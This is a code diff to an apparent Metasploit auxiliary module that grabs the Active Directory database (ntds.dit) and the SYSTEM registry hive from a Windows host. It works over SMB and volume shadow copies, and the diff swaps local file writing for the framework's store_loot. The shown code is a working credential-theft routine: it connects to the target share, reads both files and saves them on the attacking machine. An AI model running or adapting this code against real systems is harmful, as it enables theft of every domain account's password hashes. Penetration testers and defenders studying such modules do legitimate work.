@@ -45,7 +45,6 @@ class Metasploit3 < Msf::Auxiliary
 
 		register_options([
 			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
-			OptString.new('LOGDIR', [true, 'Directory on local system used to store the ntds.dit and SYSTEM hive', '/tmp/NTDS_Grab']),
 			OptString.new('VSCPATH', [false, 'The path to the target Volume Shadow Copy', '']),
 			OptString.new('WINPATH', [true, 'The name of the Windows directory (examples: WINDOWS, WINNT)', 'WINDOWS']),
 			OptBool.new('CREATE_NEW_VSC', [false, 'If true, attempts to create a volume shadow copy', 'false']),
@@ -65,7 +64,6 @@ class Metasploit3 < Msf::Auxiliary
 		text = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
 		bat = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
 		createvsc = "vssadmin create shadow /For=%SYSTEMDRIVE%"
-		logdir = datastore['LOGDIR']
 		@ip = datastore['RHOST']
 		@smbshare = datastore['SMBSHARE']
 		# Try and connect
@@ -91,8 +89,8 @@ class Metasploit3 < Msf::Auxiliary
 			end
 			if vscpath
 				if !(n = copy_ntds(@ip, vscpath, text)) == false && !(s = copy_sys_hive(@ip)) == false
-					download_ntds((datastore['WINPATH'] + "\\Temp\\ntds"), @ip, logdir)
-					download_sys_hive((datastore['WINPATH'] + "\\Temp\\sys"), @ip, logdir)
+					download_ntds((datastore['WINPATH'] + "\\Temp\\ntds"), @ip)
+					download_sys_hive((datastore['WINPATH'] + "\\Temp\\sys"), @ip)
 				else
 					print_error("#{peer} - Failed to find a volume shadow copy.  Issuing cleanup command sequence.")
 				end
@@ -194,19 +192,14 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	# Download the ntds.dit copy to your attacking machine
-	def download_ntds(file, ip, logdir)
+	def download_ntds(file, ip)
 		print_status("Downloading ntds.dit file")
 		begin
 			# Try to download ntds.dit
-			newdir = "#{logdir}/#{ip}"
-			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
 			simple.connect("\\\\#{ip}\\#{@smbshare}")
 			remotefile = simple.open("#{file}", 'rob')
 			data = remotefile.read
-			#Save it to local file system
-			file = File.open("#{logdir}/#{ip}/ntds", "wb+")
-			file.write(data)
-			file.close
+			store_loot("NTDS.database", "data", ip, data, "ntds.dit", nil, nil)
 			remotefile.close
 		rescue StandardError => ntdsdownloaderror
 			print_error("Unable to downlaod ntds.dit: #{ntdsdownloaderror}")
@@ -217,19 +210,14 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	# Download the SYSTEM hive copy to your attacking machine
-	def download_sys_hive(file, ip, logdir)
+	def download_sys_hive(file, ip)
 		print_status("Downloading SYSTEM hive file")
 		begin
 			# Try to download SYSTEM hive
-			newdir = "#{logdir}/#{ip}"
-			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
 			simple.connect("\\\\#{ip}\\#{@smbshare}")
 			remotefile = simple.open("#{file}", 'rob')
 			data = remotefile.read
-			#Save it to local file system
-			file = File.open("#{logdir}/#{ip}/sys", "wb+")
-			file.write(data)
-			file.close
+			store_loot("Registry.hive.system", "binary/reg", ip, data, "system-hive", nil, nil)
 			remotefile.close
 		rescue StandardError => sysdownloaderror
 			print_error("Unable to download SYSTEM hive: #{sysdownloaderror}")
